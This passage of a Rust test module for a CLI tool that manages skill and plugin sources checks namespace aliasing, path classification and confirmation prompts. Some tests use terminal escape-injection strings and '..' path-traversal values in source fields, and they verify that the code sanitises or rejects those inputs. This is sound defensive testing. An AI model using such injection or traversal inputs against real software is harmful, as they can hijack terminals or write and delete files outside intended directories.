        assert_eq!(reg.sources[0].alias, None, "no alias should be written");
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_locked_when_items_installed_and_alias_differs() {
        // spec: NS-30 CLI-161 - changing the alias while items are installed is
        // refused with NamespaceLocked naming the installed item keys; nothing
        // is persisted.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", None);
        seed_installed_item(&paths, &name, ItemKind::Skill, "review");
        let r = set_source_namespace(&paths, &name, Some("jk".into()));
        match r {
            Err(MindError::NamespaceLocked { src_name, items }) => {
                assert_eq!(src_name, name);
                assert!(
                    items.contains(&"skill:review".to_string()),
                    "locked error must list the installed item key: {items:?}"
                );
            }
            other => panic!("expected NamespaceLocked, got {other:?}"),
        }
        // The alias must NOT have been persisted despite the requested change.
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(
            reg.sources[0].alias, None,
            "a locked change must not write the new alias"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    /// DSC-95: `NamespaceLocked`'s `items` list (built from each locked item's
    /// `key()`) must reach the caller already sanitized -- `MindError::
    /// NamespaceLocked`'s `#[error(...)]` Display joins `items` verbatim into
    /// the rejection message with no sanitizing step of its own, so a raw ESC
    /// byte in an installed name would otherwise ride straight to a terminal
    /// via `main.rs`'s `eprintln!("error: {err}")`.
    // spec: DSC-95
    #[test]
    fn set_source_namespace_locked_message_sanitizes_installed_item_key() {
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", None);
        seed_installed_item(&paths, &name, ItemKind::Skill, "evil\x1b[31mname");
        let r = set_source_namespace(&paths, &name, Some("jk".into()));
        let msg = match r {
            Err(e @ MindError::NamespaceLocked { .. }) => e.to_string(),
            other => panic!("expected NamespaceLocked, got {other:?}"),
        };
        assert!(!msg.contains('\x1b'), "must strip raw ESC: {msg:?}");
        assert!(msg.contains("evil"), "must still name the item: {msg}");
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_unchanged_alias_with_items_is_noop() {
        // spec: NS-30 CLI-161 - re-applying the SAME alias is allowed even with
        // items installed: the lock only guards an actual change.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", Some("jk"));
        seed_installed_item(&paths, &name, ItemKind::Skill, "jk:review");
        let r = set_source_namespace(&paths, &name, Some("jk".into()));
        assert!(
            r.is_ok(),
            "an unchanged alias must be a no-op even with items installed: {r:?}"
        );
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(reg.sources[0].alias.as_deref(), Some("jk"));
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_allowed_and_persisted_when_no_items() {
        // spec: NS-30 CLI-161 - with zero installed items the alias changes and
        // is persisted to sources.json.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", None);
        set_source_namespace(&paths, &name, Some("jk".into())).expect("set namespace");
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(
            reg.sources[0].alias.as_deref(),
            Some("jk"),
            "the new alias must be persisted"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_never_sets_identity_alias() {
        // spec: STO-60 -- the fork note's guard checks ONLY `Source.as_alias`
        // (the pre-clone identity alias, STO-58), never the display `alias`.
        // `set_source_namespace` is the same kind of *display-only* prefix
        // mutation as an accepted `[source].prefix` (see its doc comment: "this
        // changes the source's effective display prefix (`alias`), not its
        // identity"). This locks in that `as_alias` stays untouched when the
        // display alias changes, so a source that only ever received a display
        // prefix can never spuriously satisfy the STO-60 fork-note guard
        // (`source.as_alias.as_deref().is_some_and(|a| !a.is_empty())`), no
        // matter how many other instances of the same repo are registered.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", None);
        set_source_namespace(&paths, &name, Some("jk".into())).expect("set namespace");
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(
            reg.sources[0].alias.as_deref(),
            Some("jk"),
            "the display alias must change"
        );
        assert_eq!(
            reg.sources[0].as_alias, None,
            "the identity alias must stay None: a display-prefix-only change \
             must never satisfy the STO-60 fork-note guard"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_empty_string_clears_consumer_prefix() {
        // spec: NS-30 CLI-161 - setting an empty alias (the "no prefix" override)
        // persists Some("") which the catalog treats as no consumer prefix.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", Some("jk"));
        set_source_namespace(&paths, &name, Some(String::new())).expect("clear namespace");
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(
            reg.sources[0].alias.as_deref(),
            Some(""),
            "empty string override must persist as Some(\"\")"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_none_equals_empty_is_noop() {
        // spec: NS-30 CLI-161 - None and Some("") are the same "no prefix" state,
        // so requesting None when the current alias is None changes nothing.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", None);
        set_source_namespace(&paths, &name, None).expect("noop");
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(reg.sources[0].alias, None);
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn set_source_namespace_rejects_reserved_kind_word() {
        // spec: NS-25 NS-30 - validate_prefix rejects a reserved kind word before
        // any registry mutation, returning ReservedPrefix.
        let (paths, base) = ns_paths();
        let name = seed_source(&paths, "agents", None);
        let r = set_source_namespace(&paths, &name, Some("skill".into()));
        assert!(
            matches!(r, Err(MindError::ReservedPrefix { ref prefix }) if prefix == "skill"),
            "a reserved kind word must be rejected: {r:?}"
        );
        // The registry must be untouched.
        let reg = Registry::load(&paths).unwrap();
        assert_eq!(reg.sources[0].alias, None);
        let _ = std::fs::remove_dir_all(&base);
    }

    // ----- MKT-10: origin_label mapping -----

    #[test]
    fn origin_label_none_returns_empty() {
        assert_eq!(
            origin_label(None),
            "",
            "no origin -> empty string (no extra token)"
        );
    }

    #[test]
    fn origin_label_claude_plugin_returns_token() {
        let label = origin_label(Some(ManifestOrigin::ClaudePlugin));
        assert_eq!(
            label, " origin:claude-plugin",
            "ClaudePlugin must produce the 'origin:claude-plugin' token with leading space"
        );
    }

    #[test]
    fn origin_label_claude_marketplace_returns_token() {
        let label = origin_label(Some(ManifestOrigin::ClaudeMarketplace));
        assert_eq!(
            label, " origin:claude-marketplace",
            "ClaudeMarketplace must produce the 'origin:claude-marketplace' token with leading space"
        );
    }

    // ----- MKT-7: marketplace_entry_spec helper -----

    #[test]
    fn marketplace_entry_spec_external_passes_spec_through() {
        let entry = plugin_manifest::MarketplaceEntry {
            name: "my-plugin".to_string(),
            source: plugin_manifest::PluginSource::External {
                spec: "owner/my-plugin".to_string(),
            },
            version: None,
            description: None,
            skills: vec![],
        };
        let clone_dir = std::path::Path::new("/some/catalog/clone");
        let spec = marketplace_entry_spec(&entry, clone_dir);
        assert_eq!(
            spec, "owner/my-plugin",
            "External spec must pass through verbatim"
        );
    }

    #[test]
    fn marketplace_entry_spec_in_repo_joins_onto_clone_dir() {
        let entry = plugin_manifest::MarketplaceEntry {
            name: "embedded".to_string(),
            source: plugin_manifest::PluginSource::InRepo {
                path: "plugins/embedded".to_string(),
            },
            version: None,
            description: None,
            skills: vec![],
        };
        let clone_dir = std::path::Path::new("/home/user/.mind/sources/local/owner/catalog");
        let spec = marketplace_entry_spec(&entry, clone_dir);
        assert_eq!(
            spec, "/home/user/.mind/sources/local/owner/catalog/plugins/embedded",
            "InRepo spec must be clone_dir joined with the in-repo path"
        );
    }

    #[test]
    fn marketplace_entry_spec_in_repo_dotslash_prefix() {
        // A relative path like "./plugins/p1" (validated safe by load_marketplace_manifest)
        // is joined onto clone_dir and the result is a usable local path.
        let entry = plugin_manifest::MarketplaceEntry {
            name: "p1".to_string(),
            source: plugin_manifest::PluginSource::InRepo {
                path: "./plugins/p1".to_string(),
            },
            version: None,
            description: None,
            skills: vec![],
        };
        let clone_dir = std::path::Path::new("/repo");
        let spec = marketplace_entry_spec(&entry, clone_dir);
        // Path::join normalises "./" on the joined string; the key property is
        // that the spec resolves inside clone_dir.
        assert!(
            spec.starts_with("/repo"),
            "InRepo spec with ./ prefix must still be rooted inside clone_dir: {spec}"
        );
    }

    /// `offer_save_absorb_to(yes=true)` writes `absorb_to` into config.toml,
    /// creating the config when absent (the ABS-4 save path, reachable headlessly
    /// only via the --yes branch). This is the side of ABS-4 that does NOT need a
    /// TTY; the interactive [y/N] save prompt is TTY-gated (see certification).
    // spec: ABS-4
    #[test]
    fn offer_save_absorb_to_yes_writes_config() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!("mind-abs-save-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let paths = Paths {
            mind_home: base.join("mind"),
            claude_home: base.join("claude"),
        };
        // No config exists yet.
        assert!(
            !paths.config_file().exists(),
            "sanity: config.toml must not pre-exist"
        );
        let dest = base.join("personal");
        offer_save_absorb_to(&paths, &dest, true).expect("offer_save_absorb_to");

        // Config now exists and records absorb_to = the chosen dest.
        let cfg = Config::load(&paths).expect("load config");
        assert_eq!(
            cfg.absorb_to.as_deref(),
            Some(dest.to_string_lossy().as_ref()),
            "the chosen destination must be saved as absorb_to"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    // ---- CLI-212/CLI-213: a single-source scan does not degrade ----

    /// `scan_one` is the non-degrading counterpart of
    /// `catalog::scan(paths, &single(src))`, and the difference between the two
    /// is the whole point of every site that moved onto it. The DSC-80 curator
    /// guard in `meld_recursive` is the one such site that cannot be driven into
    /// this state from the CLI hermetically (it scans the primary source it just
    /// registered, whose directory was verified moments earlier), so the contract
    /// it now rests on is pinned here directly: for the SAME gone source, the
    /// registry walk yields an empty catalog and the single-source scan errors.
    /// Were the guard still on the degrading scan, a `LinkedSourceGone` primary
    /// would scan as empty and be reported as `CuratorAllNestedFailed` -- a real
    /// condition, but not this one.
    #[test]
    fn scan_one_hard_fails_where_the_registry_walk_degrades() {
        // spec: CLI-212 CLI-213
        let (paths, base) = ns_paths();
        let gone = base.join("never-created");
        let src = crate::source::parse_spec(&gone.to_string_lossy()).expect("parse local spec");
        assert!(
            src.is_linked(),
            "sanity: a local unpinned source is linked (CLI-27), which is what \
             LinkedSourceGone applies to"
        );

        let degraded =
            catalog::scan(&paths, &single(&src)).expect("the registry walk degrades, CLI-213");
        assert!(
            degraded.is_empty(),
            "the degraded result is indistinguishable from a healthy source with \
             no items, which is exactly why a single-source caller cannot use it"
        );

        let err = scan_one(&paths, &src).expect_err("a single-source scan must not degrade");
        assert!(
            matches!(err, MindError::LinkedSourceGone { .. }),
            "the vanished working tree must surface as LinkedSourceGone (with its \
             `mind unmeld` remedy), got: {err:?}"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    // ---- DSC-93: the absolute entry wins ----

    /// The DSC-93 predicate, at its four boundaries. It is structural (a
    /// non-existent path inside mind's managed sources tree) rather than
    /// name-based, so it must not fire for a remote entry, for a mistyped
    /// relative path in a LINKED curator (which resolves into the user's own
    /// tree and still fails as DSC-79/DSC-80 describe), or for a path that
    /// actually exists (a sibling clone the same walk already created, which the
    /// DSC-70 already-registered guard handles).
    #[test]
    fn dsc93_skips_only_a_missing_path_inside_the_managed_sources_tree() {
        // spec: DSC-93
        let (paths, base) = ns_paths();

        // (1) A remote entry: never a local path, never skipped.
        assert_eq!(
            unresolvable_managed_local_entry(&paths, "github:acme/nested"),
            None,
            "a remote entry must never be skipped"
        );

        // (2) A local path outside the sources tree that does not exist: a
        // curator typo in the user's own working tree, which keeps failing.
        let typo = base.join("curator-worktree").join("nested-lib");
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &typo.to_string_lossy()),
            None,
            "a missing path outside the sources tree is a real error, not a skip"
        );

        // (3) A path inside the sources tree that does not exist: the misresolved
        // relative reference of a cloned curator.
        let phantom = paths.sources_dir().join("local/owner/nested-lib");
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &phantom.to_string_lossy()),
            Some(phantom.clone()),
            "a missing sibling inside mind's own sources tree is the DSC-93 case"
        );

        // (4) The same path, once something IS cloned there: attempted as usual,
        // so DSC-70's already-registered guard stays in charge of it.
        std::fs::create_dir_all(&phantom).expect("create the sibling clone dir");
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &phantom.to_string_lossy()),
            None,
            "an entry that resolves to a directory that exists must be attempted"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    /// The DSC-93 predicate reaches the sources tree through
    /// `parse_spec_quiet`, which has more local-path branches than the plain
    /// absolute path the test above uses. Each of them can appear verbatim in a
    /// curator's `[discover].sources`, so each must classify the same way; a
    /// branch the predicate silently misses is a curator entry that goes back
    /// to being attempted, failing to clone, and (DSC-80) aborting a whole
    /// `dump` reproduction.
    #[test]
    fn dsc93_classifies_every_local_spec_form_the_parser_accepts() {
        // spec: DSC-93 CLI-216
        let (paths, base) = ns_paths();
        let phantom = paths.sources_dir().join("local/owner/nested-lib");

        // The `file://` spelling of the same missing path. `parse_spec` treats
        // it as the identical local repo, so the predicate must too.
        let file_url = format!("file://{}", phantom.display());
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &file_url),
            Some(phantom.clone()),
            "the file:// spelling of a missing sources-tree path is the same case \
             as the bare path"
        );

        // A local ITEM LINK (LNK-1) inside the sources tree: the predicate must
        // classify by the REPO part (what would be cloned), not by the deep
        // path, which never exists as a directory in its own right.
        let link = format!("file://{}/tree/main/skills/greet", phantom.display());
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &link),
            Some(phantom.clone()),
            "a local item-link entry must be classified by its repo part"
        );

        // A relative spec is resolved against the CWD, never against the
        // sources tree, so it can never be the DSC-93 case. (DSC-92 has already
        // rewritten a curator's relative entry to an absolute path by the time
        // the predicate sees it; this pins that a leftover relative string does
        // not accidentally match.)
        assert_eq!(
            unresolvable_managed_local_entry(&paths, "../nested-lib"),
            None,
            "a relative entry resolves against the cwd, never into the sources tree"
        );

        // A sibling whose name merely SHARES A PREFIX with the sources dir is
        // outside it: `starts_with` is component-wise, and this pins that.
        let neighbour = format!("{}-elsewhere/owner/nested", paths.sources_dir().display());
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &neighbour),
            None,
            "a path whose string merely shares a prefix with the sources dir is \
             not inside it"
        );

        // Something exists at the path, but as a FILE. `exists()` is true, so
        // the entry is attempted and fails as an ordinary nested clone failure
        // rather than being skipped. Documented, not incidental: mind never
        // writes a file there, so this cannot arise from mind's own bookkeeping.
        std::fs::create_dir_all(phantom.parent().expect("parent")).expect("mkdir");
        std::fs::write(&phantom, b"not a clone").expect("write file at the clone path");
        assert_eq!(
            unresolvable_managed_local_entry(&paths, &phantom.to_string_lossy()),
            None,
            "a path occupied by a FILE exists, so it is attempted (and fails as a \
             clone error) rather than skipped"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // ---- NS-44: collision prompt parsing (parse_collision_answer) ----

    #[test]
    fn collision_prompt_empty_accepts_suggested() {
        // spec: NS-44 — pressing Enter (empty answer) accepts the suggested prefix.
        match parse_collision_answer("", "myrepo") {
            CollisionAnswer::Prefix(p) => assert_eq!(p, "myrepo"),
            CollisionAnswer::Abort => panic!("empty must accept suggested, not abort"),
        }
        // Whitespace-only is also empty after trim.
        match parse_collision_answer("   ", "myrepo") {
            CollisionAnswer::Prefix(p) => assert_eq!(p, "myrepo"),
            CollisionAnswer::Abort => panic!("whitespace must accept suggested, not abort"),
        }
    }

    #[test]
    fn collision_prompt_dot_aborts() {
        // spec: NS-44 — typing "." aborts the meld (same as non-interactive path).
        assert!(
            matches!(
                parse_collision_answer(".", "myrepo"),
                CollisionAnswer::Abort
            ),
            "dot must abort"
        );
        // Dot with surrounding whitespace is still the abort sentinel.
        assert!(
            matches!(
                parse_collision_answer("  .  ", "myrepo"),
                CollisionAnswer::Abort
            ),
            "dot with whitespace must abort"
        );
    }

    #[test]
    fn collision_prompt_custom_prefix_is_preserved() {
        // spec: NS-44 — typing a custom prefix uses it verbatim (trimmed).
        match parse_collision_answer("mypfx", "suggested") {
            CollisionAnswer::Prefix(p) => assert_eq!(p, "mypfx"),
            CollisionAnswer::Abort => panic!("custom prefix must not abort"),
        }
        // Trimming applies.
        match parse_collision_answer("  mypfx  ", "suggested") {
            CollisionAnswer::Prefix(p) => assert_eq!(p, "mypfx"),
            CollisionAnswer::Abort => panic!("trimmed custom prefix must not abort"),
        }
    }

    #[test]
    fn format_conflicts_display_strips_ansi_from_name_and_source() {
        // spec: NS-44 — ANSI escape sequences in item name or source name are
        // stripped so a malicious source cannot inject terminal control codes into
        // the interactive collision prompt.
        let conflicts = vec![(
            "skill".to_string(),
            "\x1b[31mreview\x1b[0m".to_string(), // ANSI-colored name
            "\x1b[32mevil/source\x1b[0m".to_string(), // ANSI-colored source
        )];
        let out = format_conflicts_display(&conflicts);
        assert!(
            out.contains("skill:review"),
            "bare name must appear without ANSI: {out}"
        );
        assert!(
            out.contains("evil/source"),
            "bare source must appear without ANSI: {out}"
        );
        assert!(
            !out.contains('\x1b'),
            "no ANSI escape bytes must appear in the output: {out}"
        );
    }

    // ----- STO-69: clone-path confinement -----

    /// Build a `Source` directly (bypassing `parse_spec`'s own validation) so a
    /// traversing `host`/`owner`/`repo` part -- the shape a stale or
    /// hand-tampered `sources.json` entry could carry -- reaches
    /// `clone_dir_checked` exactly as it would from `Registry::load`.
    fn raw_source(host: &str, owner: &str, repo: &str) -> crate::source::Source {
        crate::source::Source {
            name: format!("{host}/{owner}/{repo}"),
            url: "https://example.com/evil".into(),
            host: host.into(),
            owner: owner.into(),
            repo: repo.into(),
            commit: None,
            description: None,
            alias: None,
            as_alias: None,
            pin: Pin::DefaultBranch,
            roots: None,
            flat_skills: false,
            add_roots: None,
            item_path: None,
            item_kind: None,
            curated_by: None,
            origin: None,
            plugin_version: None,
            install_hooks: Vec::new(),
            install_hook: None,
            install_hook_commit: None,
        }
    }

    #[test]
    fn clone_dir_checked_rejects_a_traversing_host_part() {
        // spec: STO-69 -- a `..` host segment resolves `clone_dir` outside the
        // sources tree; `clone_dir_checked` must refuse it with
        // `UnsafeClonePath` before any caller can clone into or delete it.
        let (paths, base) = ns_paths();
        let source = raw_source("..", "..", "victim");
        let err = clone_dir_checked(&paths, &source).expect_err("traversing host must be refused");
        match err {
            MindError::UnsafeClonePath { identity, .. } => {
                assert_eq!(identity, source.name);
            }
            other => panic!("expected UnsafeClonePath, got {other:?}"),
        }
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn clone_dir_checked_rejects_a_traversing_repo_part() {
        // spec: STO-69 -- same guard, the `..` on the `repo` segment instead
        // (host/owner both structurally safe, single-component values).
        let (paths, base) = ns_paths();
        let source = raw_source("github.com", "acme", "../../victim");
        let err = clone_dir_checked(&paths, &source).expect_err("traversing repo must be refused");
        assert_eq!(err.kind(), "unsafe-clone-path");
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn clone_dir_checked_accepts_a_well_formed_source() {
        // spec: STO-69 -- an ordinary source's clone dir stays confined under
        // the sources tree and must be accepted.
        let (paths, base) = ns_paths();
        let source = raw_source("github.com", "acme", "agents");
        let dir = clone_dir_checked(&paths, &source).expect("well-formed source must be accepted");
        assert!(
            dir.starts_with(paths.sources_dir()),
            "accepted clone dir must be under the sources tree: {}",
            dir.display()
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    // ----- CLI-233/CLI-234/CLI-235: naming an upgrade pass's matched sources
    // before consent -----

    #[test]
    fn multi_source_upgrade_note_none_for_empty_scope() {
        // spec: CLI-233 -- an unscoped `--upgrade` pass (bare `mind upgrade`,
        // or `sync --upgrade` with no `[source]` filter) must not grow the
        // prompt: `scope_names` is empty in that case.
        assert!(multi_source_upgrade_note(&[], None).is_none());
    }

    #[test]
    fn multi_source_upgrade_note_none_for_single_match() {
        // spec: CLI-233 -- a filter that resolved to exactly one source reads
        // like naming that source already; the prompt must not grow.
        let names = vec!["github.com/acme/skills".to_string()];
        assert!(
            multi_source_upgrade_note(&names, Some("skills")).is_none(),
            "a single-match filter must not grow the confirmation"
        );
    }

    #[test]
    fn multi_source_upgrade_note_names_every_match_for_multi_match() {
        // spec: CLI-233 -- the defect this covers: `mind sync skills
        // --upgrade` can match several sources while reading as if it named
        // one. When the filter matches more than one source, the note must
        // name every one of them so the blast radius (each matched source's
        // items upgraded, and its install hook possibly re-run) is visible
        // before consent.
        let names = vec![
            "github.com/acme/skills".to_string(),
            "github.com/other/skills".to_string(),
        ];
        let note = multi_source_upgrade_note(&names, Some("skills"))
            .expect("a multi-match filter must produce a naming note");
        assert!(
            note.contains("github.com/acme/skills"),
            "note must name the first matched source: {note}"
        );
        assert!(
            note.contains("github.com/other/skills"),
            "note must name the second matched source: {note}"
        );
        assert!(
            note.contains('2'),
            "note must state the match count: {note}"
        );
    }

    #[test]
    fn multi_source_upgrade_note_echoes_the_filter_string() {
        // spec: CLI-235 -- M19: the note must echo the filter TEXT that did
        // the matching, not just the count/names of what it matched.
        let names = vec![
            "github.com/acme/skills".to_string(),
            "github.com/other/skills".to_string(),
        ];
        let note = multi_source_upgrade_note(&names, Some("skills")).expect("multi-match note");
        assert!(
            note.contains("skills"),
            "note must echo the filter string: {note}"
        );
    }

    #[test]
    fn multi_source_upgrade_note_names_a_narrowing_remedy() {
        // spec: CLI-235 -- M19: the note must end with a real next step (a
        // longer suffix, or the full `host/owner/repo` identity), matching
        // every other confirmation in this module.
        let names = vec![
            "github.com/acme/skills".to_string(),
            "github.com/other/skills".to_string(),
        ];
        let note = multi_source_upgrade_note(&names, Some("skills")).expect("multi-match note");
        assert!(
            note.contains("host/owner/repo") || note.to_lowercase().contains("narrow"),
            "note must state a narrowing remedy: {note}"
        );
    }

    #[test]
    fn multi_source_upgrade_note_omits_filter_clause_when_no_filter_text() {
        // spec: CLI-234 -- the TUI's key-scoped apply has no textual filter
        // to echo (`filter_desc = None`); the note must still fire (the union
        // scope can still span more than one source) without claiming to
        // quote a filter that was never given.
        let names = vec![
            "github.com/acme/skills".to_string(),
            "github.com/other/skills".to_string(),
        ];
        let note = multi_source_upgrade_note(&names, None).expect("multi-match note");
        assert!(
            !note.contains('"'),
            "must not fabricate a quoted filter string: {note}"
        );
    }

    #[test]
    fn multi_source_upgrade_note_strips_ansi_from_source_names() {
        // spec: CLI-233 DSC-95 -- a source name is source-controlled (an
        // `[source].description`-adjacent identity string can be influenced by
        // the melded repo); sanitize each name before composing the note,
        // mirroring every other DSC-95 print site in this module.
        let names = vec![
            "\x1b[2Jevil".to_string(),
            "github.com/other/skills".to_string(),
        ];
        let note = multi_source_upgrade_note(&names, None).expect("multi-match note");
        assert!(
            !note.contains('\x1b'),
            "ANSI escape byte must be stripped: {note:?}"
        );
        assert!(note.contains("evil"), "printable text must survive: {note}");
    }

    #[test]
    fn json_confirmation_action_embeds_multi_source_note() {
        // spec: CLI-233 -- under `--json`, `sync <filter> --upgrade`'s
        // `ConfirmationRequired` (LIFE-45: --json never prompts) still names
        // the matched sources in its `action` text, so a machine caller sees
        // the same blast-radius disclosure a human would at the text prompt,
        // rather than a generic message that reads as a single-source
        // upgrade regardless of how many sources the filter actually matched.
        let names = vec![
            "github.com/acme/skills".to_string(),
            "github.com/other/skills".to_string(),
        ];
        let note = multi_source_upgrade_note(&names, Some("skills")).expect("multi-match note");
        let action = json_confirmation_action(format!("applying pending upgrades ({note})"), true);
        assert!(
            action.contains("github.com/acme/skills"),
            "action: {action}"
        );
        assert!(
            action.contains("github.com/other/skills"),
            "action: {action}"
        );
        assert!(
            action.contains("--json is always non-interactive"),
            "action must still carry the LIFE-45 --json remedy text: {action}"
        );
    }

    #[test]
    fn json_confirmation_action_unchanged_for_single_source() {
        // spec: CLI-233 -- a single-match filter (or no filter) must not
        // widen the --json refusal's action text either.
        let action = json_confirmation_action("applying pending upgrades", true);
        assert_eq!(
            action,
            "applying pending upgrades (--json is always non-interactive; --yes is the only way to proceed)"
        );
    }
}
